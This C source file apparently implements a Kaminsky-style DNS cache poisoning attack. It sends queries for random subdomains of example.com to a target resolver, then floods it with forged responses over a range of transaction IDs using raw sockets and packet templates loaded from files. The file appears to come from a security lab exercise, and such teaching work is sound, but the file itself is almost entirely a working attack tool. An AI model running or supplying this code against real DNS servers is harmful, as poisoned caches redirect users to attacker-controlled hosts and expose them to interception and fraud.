#include <stdlib.h>
#include <arpa/inet.h>
#include <string.h>
#include <stdio.h>
#include <unistd.h>
#include <time.h>

#define MAX_FILE_SIZE 1000000

#define HOSTNAME_QUERY_LENGTH 0x5

// For DNS request
#define OFFSET_HOSTNAME_REQUEST 0x29

//For DNS Response
#define OFFSET_HOSTNAME_QUERY_RESPONSE 0x29
#define OFFSET_HOSTNAME_ANSWER_RESPONSE 0x40
#define OFFSET_TRANSACTION_ID_RESPONSE 0x1c

/* IP Header */
struct ipheader {
  unsigned char      iph_ihl:4, //IP header length
                     iph_ver:4; //IP version
  unsigned char      iph_tos; //Type of service
  unsigned short int iph_len; //IP Packet length (data + header)
  unsigned short int iph_ident; //Identification
  unsigned short int iph_flag:3, //Fragmentation flags
                     iph_offset:13; //Flags offset
  unsigned char      iph_ttl; //Time to Live
  unsigned char      iph_protocol; //Protocol type
  unsigned short int iph_chksum; //IP datagram checksum
  struct  in_addr    iph_sourceip; //Source IP address 
  struct  in_addr    iph_destip;   //Destination IP address 
};

void send_raw_packet(char * buffer, int pkt_size);
void send_dns_request(char* name, unsigned char* ip_req, int n_req);
void send_dns_response(char* name, unsigned char* ip_resp, int n_resp, unsigned short id);

int main(int argc, char **argv)
{
  if (argc != 2)
  {
    printf("Usage: ./attack <num_query_spoofing\n");
    return -1;
  }

  // Times to loop
  int times = atoi(argv[1]);

  srand(time(NULL));

  // Load the DNS request packet from file
  FILE * f_req = fopen("ip_req.bin", "rb");
  if (!f_req) {
     perror("Can't open 'ip_req.bin'");
     exit(1);
  }
  unsigned char ip_req[MAX_FILE_SIZE];
  int n_req = fread(ip_req, 1, MAX_FILE_SIZE, f_req);

  // Load the first DNS response packet from file
  FILE * f_resp = fopen("ip_resp.bin", "rb");
  if (!f_resp) {
     perror("Can't open 'ip_resp.bin'");
     exit(1);
  }
  unsigned char ip_resp[MAX_FILE_SIZE];
  int n_resp = fread(ip_resp, 1, MAX_FILE_SIZE, f_resp);

  char a[26]="abcdefghijklmnopqrstuvwxyz";
  
  int i = 0;
  
  while (i < times) {
    unsigned short transaction_id = 1000;
  
    // Generate a random name with length HOSTNAME_QUERY_LENGTH = 5
    char name[HOSTNAME_QUERY_LENGTH + 1];
    for (int k=0; k < HOSTNAME_QUERY_LENGTH; k++)  
      name[k] = a[rand() % 26];
    name[HOSTNAME_QUERY_LENGTH] = '\0';  

    printf("Request #%d is [%s.example.com], begin with transaction ID is: [%hu]\n", i++, name, transaction_id); 
    
    
    /* Step 1. Send a DNS request to the targeted local DNS server.
               This will trigger the DNS server to send out DNS queries */
    send_dns_request(name, ip_req, n_req);
    
    sleep(0.10);
    
    /* Step 2. Send many spoofed responses to the targeted local DNS server,
               each one with a different transaction ID. */
    for (transaction_id = 1000; transaction_id < 1101; transaction_id++){
      send_dns_response(name, ip_resp, n_resp, transaction_id);}
      
    sleep(0.10);
  }
}


/* Use for sending DNS request (Change hostname query)
 * name	: Hostname query
 * ip_req	: packet request template
 * n_req	: length of DNS Request
 * */
void send_dns_request(char* name, unsigned char* ip_req, int n_req)
{
  // Modify hostname in DNS Request (5 bytes - fixed length) in specified offset
  memcpy(ip_req + OFFSET_HOSTNAME_REQUEST, name, HOSTNAME_QUERY_LENGTH);
  
  // Send DNS Request
  send_raw_packet(ip_req, n_req);
}

/* Use for sending forged DNS response.
 * name	: Hostname in query and answer
 * ip_resp	: packet response template
 * n_resp	: length of DNS Response
 * id		: transaction id of DNS Response  
 * */
void send_dns_response(char* name, unsigned char* ip_resp, int n_resp, unsigned short id)
{
  // Modify hostname in Query and Anwser in DNS Request (5 bytes - fixed length) in specified offset
  memcpy(ip_resp + OFFSET_HOSTNAME_QUERY_RESPONSE, name, HOSTNAME_QUERY_LENGTH);
  memcpy(ip_resp + OFFSET_HOSTNAME_ANSWER_RESPONSE, name, HOSTNAME_QUERY_LENGTH);

  // Modify the transaction ID field (offset = 0x1c)
  unsigned short id_net_order = htons(id);
  memcpy(ip_resp + OFFSET_TRANSACTION_ID_RESPONSE, &id_net_order, 2);

  // Send DNS Response
  send_raw_packet(ip_resp, n_resp);
}


/* Send the raw packet out 
 *    buffer: to contain the entire IP packet, with everything filled out.
 *    pkt_size: the size of the buffer.
 * */
void send_raw_packet(char * buffer, int pkt_size)
{
  struct sockaddr_in dest_info;
  int enable = 1;

  // Step 1: Create a raw network socket.
  int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);

  // Step 2: Set socket option.
  setsockopt(sock, IPPROTO_IP, IP_HDRINCL,
	     &enable, sizeof(enable));

  // Step 3: Provide needed information about destination.
  struct ipheader *ip = (struct ipheader *) buffer;
  dest_info.sin_family = AF_INET;
  dest_info.sin_addr = ip->iph_destip;

  // Step 4: Send the packet out.
  sendto(sock, buffer, pkt_size, 0,
       (struct sockaddr *)&dest_info, sizeof(dest_info));
  close(sock);
}
